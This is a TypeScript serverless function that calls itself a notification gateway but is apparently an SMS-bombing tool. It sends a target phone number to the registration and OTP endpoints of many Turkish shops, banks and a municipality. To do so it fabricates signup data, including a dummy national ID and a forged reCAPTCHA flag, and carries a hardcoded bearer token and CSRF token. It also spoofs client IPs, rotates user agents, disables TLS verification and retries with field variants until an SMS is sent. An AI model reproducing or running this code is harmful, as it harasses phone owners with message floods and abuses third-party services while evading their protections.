// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Bypass (Legacy sistem simülasyonu için)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ─── TYPES ──────────────────────────────────────────────────────────────────

export interface NotificationRequest {
  recipient: string;
  serviceId: string;
  email?: string;
  metadata?: Record<string, unknown>;
}

export interface NotificationResult {
  provider: string;
  success: boolean;
  error?: string;
  attempts: number;
}

// ─── STEALTH UTILITIES (IP & UA ROTATION) ────────────────────────────────────

const getRandomTurkishIP = () => {
  const blocks = [[88, 224, 255], [85, 96, 111], [176, 216, 223], [195, 174, 175], [94, 54, 55]];
  const b = blocks[Math.floor(Math.random() * blocks.length)];
  return `${b[0]}.${Math.floor(Math.random() * (b[2] - b[1])) + b[1]}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

const getRandomUA = () => {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
};

// ─── CIRCUIT BREAKER ──────────────────────────────────────────────────────────

class CircuitBreaker {
  private state: "CLOSED" | "OPEN" = "CLOSED";
  private failures = 0;
  private lastFailure = 0;
  private readonly threshold = 3;
  private readonly cooldown = 30000;

  constructor(public readonly name: string) {}

  get isAllowed(): boolean {
    if (this.state === "OPEN" && Date.now() - this.lastFailure > this.cooldown) {
      this.state = "CLOSED";
      this.failures = 0;
    }
    return this.state === "CLOSED";
  }

  onSuccess() { this.failures = 0; this.state = "CLOSED"; }
  onFailure() {
    this.failures++;
    this.lastFailure = Date.now();
    if (this.failures >= this.threshold) this.state = "OPEN";
  }
}

// ─── ADAPTER PATTERN (PROVISIONING LOGIC) ─────────────────────────────────────

interface ProviderAdapter {
  readonly name: string;
  transform(req: NotificationRequest): { body: any; headers: any };
}

// Yardımcı fonksiyonlar
const generateRandomEmail = () => {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 15; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result + '@gmail.com';
};

// ─── ÇALIŞAN SERVİS ADAPTERLERİ ───────────────────────────────────────────────

class KahveDunyasiAdapter implements ProviderAdapter {
  readonly name = "kahve_dunyasi";
  transform(req: NotificationRequest) {
    return {
      body: { countryCode: "90", phoneNumber: req.recipient },
      headers: {
        "X-Client-Platform": "web",
        "X-Language-Id": "tr-TR",
        "Origin": "https://www.kahvedunyasi.com",
        "Referer": "https://www.kahvedunyasi.com/"
      }
    };
  }
}

class WmfAdapter implements ProviderAdapter {
  readonly name = "wmf";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        confirm: "true",
        date_of_birth: "1990-01-01",
        email: email,
        email_allowed: "true",
        first_name: "Test",
        gender: "male",
        last_name: "User",
        password: "Test123!Test",
        phone: `0${req.recipient}`
      },
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    };
  }
}

class EvideaAdapter implements ProviderAdapter {
  readonly name = "evidea";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
    const data = `--${boundary}\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nTest\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="last_name"\r\n\r\nUser\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="email"\r\n\r\n${email}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="phone"\r\n\r\n0${req.recipient}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="password"\r\n\r\nTest123!\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="confirm"\r\n\r\ntrue\r\n` +
      `--${boundary}--`;
    return {
      body: data,
      headers: { 
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
        "X-Project-Name": "undefined",
        "X-App-Type": "akinon-mobile",
        "X-Requested-With": "XMLHttpRequest",
        "X-App-Device": "ios",
        "Referer": "https://www.evidea.com/"
      }
    };
  }
}

class DrAdapter implements ProviderAdapter {
  readonly name = "dr";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.dr.com.tr",
        "Referer": "https://www.dr.com.tr/"
      }
    };
  }
}

class FileMarketAdapter implements ProviderAdapter {
  readonly name = "file_market";
  transform(req: NotificationRequest) {
    return {
      body: { mobilePhoneNumber: `90${req.recipient}` },
      headers: { 
        "Content-Type": "application/json",
        "X-Os": "IOS",
        "X-Version": "1.7"
      }
    };
  }
}

class YappAdapter implements ProviderAdapter {
  readonly name = "yapp";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        app_version: "1.1.2",
        code: "tr",
        device_model: "iPhone9,4",
        device_type: "I",
        device_version: "15.7.8",
        email: email,
        firstname: "Test",
        is_allow_to_communication: "1",
        language_id: "1",
        lastname: "User",
        phone_number: req.recipient,
        sms_code: ""
      },
      headers: { "Content-Type": "application/json" }
    };
  }
}

class SuisteAdapter implements ProviderAdapter {
  readonly name = "suiste";
  transform(req: NotificationRequest) {
    return {
      body: {
        action: "register",
        device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330",
        full_name: "Test User",
        gsm: req.recipient,
        is_advertisement: "1",
        is_contract: "1",
        password: "Test123!"
      },
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Mobillium-Device-Brand": "Apple",
        "X-Mobillium-Os-Type": "iOS"
      }
    };
  }
}

class FatihBelediyeAdapter implements ProviderAdapter {
  readonly name = "fatih_belediye";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
    const body = `--${boundary}\r\n` +
      `Content-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n12345678901\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n01.01.1990\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nTest\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nUser\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${req.recipient}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${email}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nTest123!\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nTest123!\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n` +
      `--${boundary}--`;
    
    return {
      body: body,
      headers: { 
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
        "Origin": "https://ebelediye.fatih.bel.tr",
        "Referer": "https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet"
      }
    };
  }
}

// FİNANS SERVİSLERİ
class BkmExpressAdapter implements ProviderAdapter {
  readonly name = "bkm_express";
  transform(req: NotificationRequest) {
    return {
      body: { phone: `90${req.recipient}` },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.bkmexpress.com.tr",
        "Referer": "https://www.bkmexpress.com.tr/"
      }
    };
  }
}

class ShopAndFlyAdapter implements ProviderAdapter {
  readonly name = "shopandfly";
  transform(req: NotificationRequest) {
    return {
      body: { phone: `90${req.recipient}` },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.shopandfly.com.tr",
        "Referer": "https://www.shopandfly.com.tr/"
      }
    };
  }
}

class TebAdapter implements ProviderAdapter {
  readonly name = "teb";
  transform(req: NotificationRequest) {
    return {
      body: { phone: `90${req.recipient}` },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.teb.com.tr",
        "Referer": "https://www.teb.com.tr/"
      }
    };
  }
}

// LİMİTLİ SERVİSLER
class HayatSuAdapter implements ProviderAdapter {
  readonly name = "hayat_su";
  transform(req: NotificationRequest) {
    return {
      body: { mobilePhoneNumber: req.recipient, actionType: "register" },
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM"
      }
    };
  }
}

class QumparaAdapter implements ProviderAdapter {
  readonly name = "qumpara";
  transform(req: NotificationRequest) {
    return {
      body: { msisdn: `+90${req.recipient}` },
      headers: { "Content-Type": "application/json" }
    };
  }
}

class BeefullAdapter implements ProviderAdapter {
  readonly name = "beefull";
  transform(req: NotificationRequest) {
    return {
      body: {
        phoneCode: "90",
        phoneNumber: req.recipient,
        tenant: "beefull"
      },
      headers: { "Content-Type": "application/json" }
    };
  }
}

// ─── AKILLI ALAN ADI NORMALİZASYONU ──────────────────────────────────────────

/**
 * Telefon numarası için bilinen tüm alan adı varyantları.
 * Sıra önemli: en yaygın olanlar başta.
 */
const PHONE_VARIANTS = [
  // prefix yok (ham numara)
  ['phone', 'Phone', 'PHONE'],
  ['phoneNumber', 'PhoneNumber', 'phone_number', 'PHONE_NUMBER'],
  ['mobilePhone', 'MobilePhone', 'mobile_phone', 'mobilePhoneNumber', 'MobilePhoneNumber'],
  ['mobile', 'Mobile', 'MOBILE'],
  ['gsm', 'GSM', 'Gsm', 'gsmNumber', 'GsmNumber', 'gsm_number'],
  ['msisdn', 'MSISDN'],
  ['tel', 'Tel', 'TEL', 'telephone', 'Telephone'],
  ['cellphone', 'CellPhone', 'cell_phone', 'cellPhone'],
  ['number', 'Number', 'phoneNum', 'PhoneNum', 'phone_num'],
  ['cep', 'CepTelefonu', 'cepTelefonu'],
];

const EMAIL_VARIANTS = [
  'email', 'Email', 'EMAIL', 'email_address', 'emailAddress', 'EmailAddress',
  'mail', 'Mail', 'e_mail', 'eMail',
];

const FIRSTNAME_VARIANTS = [
  'first_name', 'firstName', 'FirstName', 'first', 'name', 'Name', 'NAME',
  'Ad', 'ad', 'isim', 'Isim',
];

const LASTNAME_VARIANTS = [
  'last_name', 'lastName', 'LastName', 'last', 'surname', 'Surname',
  'family_name', 'Soyad', 'soyad',
];

const PASSWORD_VARIANTS = [
  'password', 'Password', 'PASSWORD', 'pass', 'Pass',
  'sifre', 'Sifre', 'şifre', 'Şifre',
];

/**
 * Servis yanıtında veya hata mesajında hangi alan adının beklendiğini bulur.
 * Örn: "phoneNumber is required" → "phoneNumber" döner
 */
function extractExpectedField(responseText: string): string | null {
  const patterns = [
    /['"](\w+)['"]\s*(is\s+)?(required|missing|not found|gerekli|zorunlu)/i,
    /(required|missing)\s+field[:\s]+['"]?(\w+)/i,
    /field\s+['"](\w+)['"]\s+(is\s+)?(invalid|required|missing)/i,
    /Alan[i]?[:\s]+['"]?(\w+)/i,
    /parametre[:\s]+['"]?(\w+)/i,
    /property[:\s]+['"](\w+)['"]/i,
  ];
  for (const p of patterns) {
    const m = responseText.match(p);
    if (m) return m[1] || m[2] || null;
  }
  return null;
}

/**
 * Mevcut body içindeki telefon alanını bulur ve tüm varyant gruplarıyla
 * yeniden yapılandırılmış body alternatifleri üretir.
 */
function generatePhoneVariantBodies(originalBody: any, phone: string): any[] {
  const alt: any[] = [];
  // Orijinal body'deki telefon değerini tespit et
  const phoneFormats = [
    phone,                        // 5XXXXXXXXX
    `90${phone}`,                 // 905XXXXXXXXX
    `+90${phone}`,                // +905XXXXXXXXX
    `0${phone}`,                  // 05XXXXXXXXX
    `+90${phone.replace(/^0/, '')}`,
  ];

  for (const formats of PHONE_VARIANTS) {
    for (const fmt of phoneFormats) {
      const candidate = { ...originalBody };
      // Eski telefon alanlarını sil
      for (const group of PHONE_VARIANTS) {
        for (const v of group) delete candidate[v];
      }
      // Yeni alan adını ekle
      candidate[formats[0]] = fmt;
      alt.push(candidate);
    }
  }
  return alt;
}

/**
 * Hata yanıtından hangi alanın eksik olduğunu çıkarır ve
 * o alana denk gelen varyantı body'e dahil eder.
 */
function patchBodyFromError(body: any, errorText: string, phone: string, email: string): any | null {
  const field = extractExpectedField(errorText);
  if (!field) return null;

  const patched = { ...body };
  const fieldLC = field.toLowerCase();

  if (PHONE_VARIANTS.flat().map(v => v.toLowerCase()).includes(fieldLC)) {
    patched[field] = phone;
    return patched;
  }
  if (EMAIL_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
    patched[field] = email || generateRandomEmail();
    return patched;
  }
  if (FIRSTNAME_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
    patched[field] = 'Test';
    return patched;
  }
  if (LASTNAME_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
    patched[field] = 'User';
    return patched;
  }
  if (PASSWORD_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
    patched[field] = 'Test123!';
    return patched;
  }
  return null;
}

// ─── AKILLI BAŞARI TESPİTİ ────────────────────────────────────────────────────
/**
 * HTTP status + response body üzerinde çok katmanlı başarı tespiti yapar.
 * Herhangi bir katman "başarılı" dönerse true kabul edilir.
 */
function detectSuccess(httpStatus: number, data: any, rawText: string): boolean {
  // Katman 1: HTTP durum kodu — 2xx veya 3xx
  if (httpStatus >= 200 && httpStatus < 400) return true;

  // Katman 2: Veri yoksa HTTP durumuna güven
  if (data == null) return false;

  // Katman 3: Tüm objeyi özyinelemeli tara
  if (typeof data === 'object') {
    if (deepScan(data)) return true;
  }

  // Katman 4: Ham metni kontrol et (HTML veya sade string yanıtlar)
  if (rawText) {
    const lc = rawText.toLowerCase();
    // Açık hata işaretleri varsa başarısız say
    const failWords = ['hata', 'error', 'fail', 'invalid', 'denied', 'unauthorized', 'forbidden', 'exception', 'timeout', 'not found'];
    const successWords = ['success', 'başarı', 'gönderildi', 'sent', 'verified', 'sms', 'otp', 'onay', 'tamam', 'ok', 'done', 'accepted'];
    const hasFail = failWords.some(w => lc.includes(w));
    const hasSuccess = successWords.some(w => lc.includes(w));
    if (hasSuccess && !hasFail) return true;
  }

  return false;
}

/**
 * JSON objesini özyinelemeli olarak tüm alan adları ve değerler üzerinde tarar.
 * Hangi alan adı gelirse gelsin başarı sinyali yakalanır.
 */
function deepScan(obj: any, depth = 0): boolean {
  if (depth > 5) return false; // Sonsuz döngü koruması

  // Değer bazlı kontroller
  const successValues = new Set([
    true, 1, '1', 'true', 'ok', 'OK', 'success', 'SUCCESS', 'Success',
    'sent', 'SENT', 'verified', 'VERIFIED', 'done', 'DONE',
    'accepted', 'ACCEPTED', 'completed', 'COMPLETED',
    'common.success', 'SMS sended succesfully!', 'Başarılı', 'başarılı',
    0 // bazı API'lar 0'ı başarı olarak döner (status: 0)
  ]);
  const successKeywords = [
    'success', 'başarı', 'tamam', 'gönderildi', 'gonderildi',
    'sent', 'verified', 'accepted', 'completed', 'done', 'ok'
  ];
  const failKeywords = [
    'error', 'hata', 'fail', 'false', 'denied', 'invalid',
    'unauthorized', 'forbidden', 'exception', 'not found'
  ];
  const successKeys = [
    'success', 'isSuccess', 'successful', 'ok', 'OK', 'Success',
    'Durum', 'durum', 'result', 'Result', 'status', 'Status',
    'processStatus', 'responseType', 'Control', 'control',
    'code', 'Code', 'isError', 'IsError', 'reachable'
  ];

  for (const key of Object.keys(obj)) {
    const val = obj[key];
    const keyLC = key.toLowerCase();

    // Alan adı başarı anahtarı mı?
    if (successKeys.includes(key)) {
      if (successValues.has(val)) return true;
      // isError gibi ters mantıklı alanlar
      if ((keyLC === 'iserror' || keyLC === 'haserror') && val === false) return true;
    }

    // Alan adında başarı kelimesi geçiyor mu?
    if (successKeywords.some(kw => keyLC.includes(kw))) {
      if (val === true || val === 1 || val === '1' || val === 'true') return true;
      if (typeof val === 'string' && successKeywords.some(kw => val.toLowerCase().includes(kw))) return true;
    }

    // String değer başarı kelimesi içeriyor mu?
    if (typeof val === 'string') {
      const valLC = val.toLowerCase();
      const hasSuccess = successKeywords.some(kw => valLC.includes(kw));
      const hasFail = failKeywords.some(kw => valLC.includes(kw));
      if (hasSuccess && !hasFail) return true;
    }

    // İç içe obje/dizi ise özyinelemeli tara
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        for (const item of val) {
          if (item && typeof item === 'object' && deepScan(item, depth + 1)) return true;
        }
      } else {
        if (deepScan(val, depth + 1)) return true;
      }
    }
  }

  return false;
}

// ─── ADAPTER REGISTRY ─────────────────────────────────────────────────────────

const adapters: Record<string, ProviderAdapter> = {
  kahve_dunyasi: new KahveDunyasiAdapter(),
  wmf: new WmfAdapter(),
  evidea: new EvideaAdapter(),
  dr: new DrAdapter(),
  file_market: new FileMarketAdapter(),
  yapp: new YappAdapter(),
  suiste: new SuisteAdapter(),
  fatih_belediye: new FatihBelediyeAdapter(),
  bkm_express: new BkmExpressAdapter(),
  shopandfly: new ShopAndFlyAdapter(),
  teb: new TebAdapter(),
  hayat_su: new HayatSuAdapter(),
  qumpara: new QumparaAdapter(),
  beefull: new BeefullAdapter(),
  // Default adapter
  default: {
    name: "default",
    transform: (r) => ({ body: { phone: r.recipient }, headers: {} })
  }
};

const breakers = new Map<string, CircuitBreaker>();

// ─── GATEWAY HANDLER ──────────────────────────────────────────────────────────

export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const { serviceId, serviceUrl, targetPhone } = body;

    if (!serviceId || !serviceUrl || !targetPhone) {
      return res.status(400).json({
        ok: false,
        error: "Missing required fields: serviceId, serviceUrl, targetPhone"
      });
    }

    // Circuit Breaker Kontrolü
    if (!breakers.has(serviceId)) breakers.set(serviceId, new CircuitBreaker(serviceId));
    const breaker = breakers.get(serviceId)!;

    if (!breaker.isAllowed) {
      return res.status(200).json({ ok: false, error: "Circuit OPEN (Cooldown)" });
    }

    // Adapter Dönüşümü
    const adapter = adapters[serviceId] || adapters.default;
    const { body: payload, headers: extraHeaders } = adapter.transform({
      recipient: targetPhone,
      serviceId,
      email: body.email
    });

    // ─── AKILLI RETRY MOTORU ──────────────────────────────────────────────────
    const fakeIP = getRandomTurkishIP();

    const doFetch = async (requestBody: any, headers: any) => {
      const isFormData    = headers['Content-Type']?.includes('multipart/form-data');
      const isUrlEncoded  = headers['Content-Type']?.includes('x-www-form-urlencoded');

      let fetchBody: string;
      let contentType = 'application/json';

      if (isFormData) {
        fetchBody = requestBody;
        contentType = headers['Content-Type'];
      } else if (isUrlEncoded) {
        fetchBody = new URLSearchParams(requestBody).toString();
        contentType = 'application/x-www-form-urlencoded';
      } else {
        fetchBody = JSON.stringify(requestBody);
      }

      return fetch(serviceUrl, {
        method: 'POST',
        headers: {
          'Content-Type': contentType,
          'User-Agent': getRandomUA(),
          'X-Forwarded-For': fakeIP,
          'X-Real-IP': fakeIP,
          'Origin': new URL(serviceUrl).origin,
          'Referer': new URL(serviceUrl).origin + '/',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
          'Accept-Encoding': 'gzip, deflate, br',
          'DNT': '1',
          'Connection': 'keep-alive',
          ...headers
        },
        body: fetchBody
      });
    };

    // 1. Deneme: adapter'ın ürettiği body
    let response = await doFetch(payload, extraHeaders);
    let responseText = await response.text();
    let responseData: any;
    try { responseData = JSON.parse(responseText); }
    catch { responseData = { raw: responseText.substring(0, 500) }; }

    let isSuccess = detectSuccess(response.status, responseData, responseText);

    // 2. Deneme: hata mesajından alan adını çıkar ve patch et
    if (!isSuccess) {
      const patched = patchBodyFromError(payload, responseText, targetPhone, body.email || generateRandomEmail());
      if (patched) {
        const r2 = await doFetch(patched, extraHeaders);
        const t2 = await r2.text();
        let d2: any;
        try { d2 = JSON.parse(t2); } catch { d2 = { raw: t2.substring(0, 500) }; }
        if (detectSuccess(r2.status, d2, t2)) {
          response = r2; responseText = t2; responseData = d2; isSuccess = true;
        }
      }
    }

    // 3. Deneme: telefon alan adı varyantlarını sırayla dene (ilk başarılıda dur)
    if (!isSuccess) {
      const variants = generatePhoneVariantBodies(payload, targetPhone);
      for (const vBody of variants) {
        const rv = await doFetch(vBody, extraHeaders);
        const tv = await rv.text();
        let dv: any;
        try { dv = JSON.parse(tv); } catch { dv = { raw: tv.substring(0, 500) }; }
        if (detectSuccess(rv.status, dv, tv)) {
          response = rv; responseText = tv; responseData = dv; isSuccess = true;
          break;
        }
      }
    }

    if (isSuccess) {
      breaker.onSuccess();
    } else {
      breaker.onFailure();
    }

    return res.status(200).json({
      ok: isSuccess,
      upstreamStatus: response.status,
      responsePreview: responseText.substring(0, 200),
      responseData: responseData
    });

  } catch (error: any) {
    console.error('Proxy error:', error);
    return res.status(200).json({ ok: false, error: error.message });
  }
}
